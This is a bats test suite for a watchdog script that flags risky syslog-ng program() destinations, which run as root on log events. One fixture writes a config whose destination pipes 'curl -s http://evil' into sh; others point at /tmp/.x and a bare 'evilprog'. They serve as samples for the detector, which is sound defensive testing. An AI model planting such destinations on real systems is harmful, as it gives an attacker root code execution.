#!/usr/bin/env bats
# L2 bats functional tests for the syslog-ng-exec-watchdog scan script.
#
# syslog-ng `program("…")` destinations run a program AS ROOT, fed every
# matching log message on its stdin — a log-event-triggered exec surface. A
# program under a writable root, relative-with-slash, bare, or carrying an
# injection pattern is alert.
#
# Runs the actual scan script with `logger` shadowed on PATH and the config
# in a tmp sandbox via SELFDEF_SYSLOGNG_FILE / _D.
#
# Run with: bats packaging/test/L2-syslog-ng-exec-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/syslog-ng-exec-watchdog/systemd/syslog-ng-exec-watchdog.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    CONF="${TMP}/syslog-ng.conf"
    CONFD="${TMP}/conf.d"; mkdir -p "${CONFD}"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_SYSLOGNG_PROFILE="${PROFILE:-report}" \
    SELFDEF_SYSLOGNG_BASELINE="${BASELINE}" \
    SELFDEF_SYSLOGNG_FILE="${CONF_F:-$CONF}" \
    SELFDEF_SYSLOGNG_D="${CONFD}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

# ============================================================
# ok tier
# ============================================================

@test "no syslog-ng config → ok / no_syslog_ng" {
    CONF_F="${TMP}/nonexistent" run_wd
    cap | grep -q '"event":"no_syslog_ng"'
    cap | grep -q '"severity":"ok"'
}

@test "benign program() destination, first run → ok / baseline_initial" {
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged config on second run → ok / syslog_ng_exec_intact" {
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"syslog_ng_exec_intact"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# alert tier
# ============================================================

@test "program() under a writable root → alert / syslog_ng_exec_suspicious" {
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd                                   # benign baseline
    printf 'destination d_evil { program("/tmp/.x"); };\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"syslog_ng_exec_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "program() carrying a curl|sh payload → alert" {
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    printf 'destination d_evil { program("curl -s http://evil | sh"); };\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a bare program() target → alert" {
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    printf 'destination d_evil { program("evilprog"); };\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# warn tier
# ============================================================

@test "a benign program change → warn / syslog_ng_exec_changed" {
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    printf 'destination d_prog { program("/usr/bin/logcollector2"); };\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"syslog_ng_exec_changed"'
    cap | grep -q '"severity":"warn"'
}

# ============================================================
# false-positive guard
# ============================================================

@test "a /usr/bin program() target is NOT flagged" {
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# enforce profile
# ============================================================

@test "enforce profile exits non-zero on a suspicious program" {
    printf 'destination d_prog { program("/usr/bin/logcollector"); };\n' > "${CONF}"
    run_wd
    printf 'destination d_evil { program("/tmp/.x"); };\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}
